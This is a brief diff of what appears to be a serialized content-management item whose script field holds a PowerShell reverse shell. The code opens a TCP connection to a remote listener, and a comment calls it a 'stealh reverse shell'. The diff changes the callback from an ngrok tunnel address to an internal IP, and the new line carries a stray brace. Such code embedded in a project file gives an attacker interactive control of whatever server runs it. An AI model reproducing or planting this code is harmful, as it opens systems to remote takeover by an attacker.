@@ -7,7 +7,7 @@ SharedFields:
 - ID: "b1a94ff0-6897-47c0-9c51-aa6acb80b1f0"
   Hint: Script
   Value: |
-    $reverseShellClient = New-Object System.Net.Sockets.TCPClient("4.tcp.eu.ngrok.io", 16114);
+    $reverseShellClient = New-Object System.Net.Sockets.TCPClient("{172.23.169.33", 9005);
     $reverseShellStream = $reverseShellClient.GetStream();
     # Generate a stealh reverse shell
     [byte[]]$reverseShellBytes = 0..65535|%{0};
